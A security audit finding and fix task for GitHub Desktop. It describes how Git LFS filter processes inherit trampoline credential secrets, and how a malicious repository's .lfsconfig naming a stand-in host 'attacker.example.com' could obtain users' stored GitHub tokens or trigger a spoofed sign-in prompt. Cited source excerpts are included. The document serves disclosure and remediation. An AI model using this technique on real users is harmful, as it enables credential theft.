## Finding

### Title
Git filter processes (e.g. Git LFS driven by a repo-tracked `.lfsconfig`) inherit the trampoline credential-helper secrets that hooks are deliberately denied - (File: `app/src/lib/trampoline/trampoline-environment.ts`)

### Summary
When Desktop shells out to Git, it hands the child process a set of secrets that let *any* process using that environment ask Desktop's `TrampolineServer` for the signed-in user's stored Git/GitHub credentials: `DESKTOP_PORT`, `DESKTOP_TRAMPOLINE_TOKEN`, and a `GIT_CONFIG_PARAMETERS` value that globally sets `credential.helper=desktop` [1](#0-0) . The comment right above this block explains *why* it's done via environment variables instead of `-c` arguments: "we want commands invoked by filters (i.e. Git LFS) to be able to pick up our configuration. Arguments passed to git commands are not passed down to filters" [2](#0-1) . That is, by design, any Git *filter* subprocess (clean/smudge/process filters such as `git-lfs`) inherits the full trampoline environment and can therefore act as a client of Desktop's credential helper.

Contrast this with Git *hooks*, for which Desktop explicitly built a sandboxing proxy: `createHooksProxy` only forwards a `safePrefixes` allow-list (`GIT_`, `GITHEAD_`) to the hook subprocess and drops everything else via `excludedEnvVars` [3](#0-2) , meaning `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN` never reach a hook. No equivalent isolation exists for filter processes.

Filter drivers are invoked based on `.gitattributes`, but the actual endpoint the filter talks to for Git LFS is controlled by `.lfsconfig`, which is a normal tracked file inside the cloned/fetched repository (i.e., fully attacker-controlled content, requiring no local access or prior compromise). When the LFS filter process (spawned by Git with the inherited trampoline environment) needs credentials for whatever `lfs.url` the malicious repo specifies, it calls into Desktop's credential helper via the same TCP trampoline mechanism used for the top-level `git` operation.

On the Desktop side, `getCredentialUrl` builds the credential endpoint purely from whatever `host`/`protocol`/`url` fields are sent by the calling process [4](#0-3) , and neither `getGitHubCredential`/`getCredential` nor `getGenericCredential` verify that the request actually corresponds to the outbound connection made by the top-level Git command the user initiated [5](#0-4) . If the requested host matches a signed-in GitHub account, `findGitHubTrampolineAccount` silently returns the stored account/OAuth token with no further confirmation [6](#0-5) ; for any other/unknown host, Desktop instead pops a native "sign in" dialog naming that attacker-chosen host [7](#0-6) [8](#0-7) .

### Finding Description
The broken invariant is that the trampoline token/port handed to a Git invocation is meant to authorize *only* the credential exchanges needed for that specific, Desktop-initiated remote operation, but it is instead handed unconditionally to every subprocess of that Git invocation, including filter drivers whose target endpoint (`lfs.url`/`lfs.pushurl` from `.lfsconfig`) is dictated by the content of the very (possibly malicious) repository being cloned/fetched. Desktop already recognized this class of risk for hooks and added `hooks-proxy.ts`'s environment allow-list to prevent exactly this leak path, but left filters unguarded because doing so was required for Git LFS's config to propagate [2](#0-1) .

### Impact Explanation
A filter process spawned during a clone/fetch of an attacker-supplied repository can reach `TrampolineServer` with a fully valid, currently-active `DESKTOP_TRAMPOLINE_TOKEN` [9](#0-8)  and request credentials for any host string it chooses. If the user is signed into GitHub.com/GHE in Desktop, this can silently retrieve their stored OAuth token without any additional user interaction. Where the account is unknown, it can still surface a native, trusted-looking Desktop credential prompt for an attacker-chosen endpoint in the middle of a routine clone operation, which the attacker fully controls the wording/host of.

### Likelihood Explanation
Exploitation requires only that the victim clone or fetch a repository that ships a `.lfsconfig` pointing `lfs.url`/`lfs.pushurl` at a host of the attacker's choosing, and that Git LFS filters are installed (Desktop installs global LFS filters itself via `installGlobalLFSFilters`) [10](#0-9) . No local access, no admin rights, and no pre-existing malware are needed — the only attacker-controlled surface is the content of the cloned/fetched repository, matching the "Valid Impact" scope.

### Recommendation
Scope the credential-helper trampoline the same way hooks are scoped: issue filter processes a distinct, narrowly-permissioned token/port (or none at all unless the credential request's host is verified against the actual Git remote/LFS endpoint currently being processed for that token), and apply an environment allow-list to filter subprocesses analogous to `hooks-proxy.ts`'s `safePrefixes`/`excludedEnvVars` instead of forwarding `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN` verbatim.

### Proof of Concept
1. Attacker publishes a repository containing a `.gitattributes` entry tracking a file with `filter=lfs` and an `.lfsconfig` with `[lfs] url = https://attacker.example.com/info/lfs`.
2. Victim, signed into GitHub.com in Desktop, clones the repository via Desktop.
3. Git spawns the `git-lfs` filter/smudge process for the tracked file; this subprocess inherits `DESKTOP_PORT`, `DESKTOP_TRAMPOLINE_TOKEN`, and `GIT_CONFIG_PARAMETERS=credential.helper=desktop` from the parent `git` invocation (per the explicit design comment in `trampoline-environment.ts`).
4. `git-lfs` calls `git credential fill` for `host=attacker.example.com`; this reaches `TrampolineServer` → `createCredentialHelperTrampolineHandler` → `getCredential`, which (a) surfaces a Desktop-native sign-in prompt naming `attacker.example.com`, or (b) if the attacker instead sets `lfs.url` to a GitHub-hosted endpoint, silently returns the victim's real GitHub token to the LFS client, which then transmits it to whatever server actually answers that URL.


Repository: Annirich/desktop--005

Goal: Prevent Git filter processes (e.g. `git-lfs` clean/smudge/process filters invoked via a repo-tracked `.gitattributes`/`.lfsconfig`) from reusing the same `DESKTOP_TRAMPOLINE_TOKEN`/`DESKTOP_PORT` that Desktop hands to the top-level `git` process for the purpose of servicing the operation the user actually initiated, since these values currently leak to filter subprocesses via inherited process environment (see `app/src/lib/trampoline/trampoline-environment.ts`, function `withTrampolineEnv`, lines ~122-147), unlike hooks which are already sandboxed through an environment variable allow-list in `app/src/lib/hooks/hooks-proxy.ts` (`safePrefixes`, `excludedEnvVars`).

Changes needed:
1. In `app/src/lib/trampoline/trampoline-environment.ts`, review why `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN`/`GIT_CONFIG_PARAMETERS` (credential.helper=desktop) are passed as raw environment variables to the spawned `git` process (see the comment explaining this is required so Git LFS filters can pick up the credential helper config). Design a mechanism so that credential requests coming from filter subprocesses can be distinguished/scoped from requests coming from the top-level git process for the actual remote operation, e.g., by:
   - Binding each trampoline token to the specific remote host(s) that are legitimately part of the current operation (the origin remote, and known LFS endpoints resolved via `.lfsconfig` validation against the operation's actual remote), and rejecting/ignoring credential requests for other hosts under that token, OR
   - Issuing filters a separate, more restricted, short-lived token that can only be used for the specific LFS endpoint already known to Desktop for that repository (verified independently of the untrusted `.lfsconfig`/`.gitattributes` content), rather than reusing the full trampoline token.
2. Update `app/src/lib/trampoline/trampoline-credential-helper.ts` (`getCredential`, `getGitHubCredential`, `getGenericCredential`, `getCredentialUrl`) so that credential lookups/prompts are validated against the expected/allow-listed host(s) for the current trampoline token rather than trusting whatever `host`/`url`/`protocol` fields are supplied by the requesting process.
3. Add/adjust unit tests (see `app/test/unit/git/lfs-test.ts` and any trampoline-related tests) to cover the scenario where a `.lfsconfig`-controlled or otherwise filter-driven credential request targets a host different from the repository's actual remote(s), verifying that such a request is rejected or does not receive stored GitHub account credentials, and that no credential prompt naming an unverified host is shown during an otherwise fully automated operation.
4. Document the security rationale in code comments near `withTrampolineEnv` to prevent this protection from being silently reverted later, similar to the existing comment about why filters need the credential helper config.

### Citations

**File:** app/src/lib/trampoline/trampoline-environment.ts (L46-59)
```typescript
export const getCredentialUrl = (cred: Map<string, string>) => {
  const u = cred.get('url')
  if (u) {
    return new URL(u)
  }

  const protocol = cred.get('protocol') ?? ''
  const username = cred.get('username')
  const user = username ? `${encodeURIComponent(username)}@` : ''
  const host = cred.get('host') ?? ''
  const path = cred.get('path') ?? ''

  return new URL(`${protocol}://${user}${host}/${path}`)
}
```

**File:** app/src/lib/trampoline/trampoline-environment.ts (L122-147)
```typescript
    try {
      return await fn({
        DESKTOP_PORT: await trampolineServer.getPort(),
        DESKTOP_TRAMPOLINE_TOKEN: token,
        GIT_ASKPASS: '',
        // This warrants some explanation. We're configuring the
        // credential helper using environment variables rather than
        // arguments (i.e. -c credential.helper=) because we want commands
        // invoked by filters (i.e. Git LFS) to be able to pick up our
        // configuration. Arguments passed to git commands are not passed
        // down to filters.
        //
        // We're using the undocumented GIT_CONFIG_PARAMETERS environment
        // variable over the documented GIT_CONFIG_{COUNT,KEY,VALUE} due
        // to an apparent bug either in a Windows Python runtime
        // dependency or in a Python project commonly used to manage hooks
        // which isn't able to handle the blank environment variables we
        // need when using GIT_CONFIG_*.
        //
        // See https://github.com/desktop/desktop/issues/18945
        // See https://github.com/git/git/blob/ed155187b429a/config.c#L664
        GIT_CONFIG_PARAMETERS: `${gitEnvConfigPrefix}'credential.helper=' 'credential.helper=desktop'`,

        GIT_USER_AGENT: await GitUserAgent(),
        ...sshEnv,
      })
```

**File:** app/src/lib/hooks/hooks-proxy.ts (L166-176)
```typescript
    // GIT_ vars are considered safe to pass to hooks unless explicitly excluded
    // GITHEAD_ are set by git-merge (https://github.com/git/git/blob/83a69f19359e6d9bc980563caca38b2b5729808c/builtin/merge.c#L1590)
    const safePrefixes = ['GIT_', 'GITHEAD_']

    const safeEnv = Object.fromEntries(
      Object.entries(proxyEnv).filter(
        ([k]) =>
          safePrefixes.some(prefix => k.startsWith(prefix)) &&
          !excludedEnvVars.has(k)
      )
    )
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L50-82)
```typescript
async function getGitHubCredential(cred: Credential, store: AccountsStore) {
  const endpoint = `${getCredentialUrl(cred)}`
  const account = await findGitHubTrampolineAccount(store, endpoint)
  if (account) {
    info(`found GitHub credential for ${endpoint} in store`)
  }
  return credWithAccount(cred, account)
}

async function promptForCredential(cred: Credential, endpoint: string) {
  const parsedUrl = new URL(endpoint)
  const username = parsedUrl.username === '' ? undefined : parsedUrl.username
  const account = await ui.promptForGenericGitAuthentication(endpoint, username)
  info(`prompt for ${endpoint}: ${account ? 'completed' : 'cancelled'}`)
  return credWithAccount(cred, account)
}

async function getGenericCredential(cred: Credential, token: string) {
  const endpoint = `${getCredentialUrl(cred)}`
  const account = await findGenericTrampolineAccount(token, endpoint)

  if (account) {
    info(`found generic credential for ${endpoint}`)
    return credWithAccount(cred, account)
  }

  if (getIsBackgroundTaskEnvironment(token)) {
    debug('background task environment, skipping prompt')
    return undefined
  } else {
    return promptForCredential(cred, endpoint)
  }
}
```

**File:** app/src/lib/trampoline/trampoline-server.ts (L162-176)
```typescript
  private async processCommand(socket: Socket, command: ITrampolineCommand) {
    if (!isValidTrampolineToken(command.trampolineToken)) {
      throw new Error('Tried to use invalid trampoline token')
    }

    const handler = this.commandHandlers.get(command.identifier)

    if (handler === undefined) {
      socket.end()
      return
    }

    const result = await handler(command).catch(e =>
      log.error('Error processing trampoline command', e)
    )
```

**File:** app/src/lib/git/lfs.ts (L10-18)
```typescript
/** Install the global LFS filters. */
export async function installGlobalLFSFilters(force: boolean): Promise<void> {
  const args = ['lfs', 'install', '--skip-repo']
  if (force) {
    args.push('--force')
  }

  await git(args, __dirname, 'installGlobalLFSFilter')
}
```
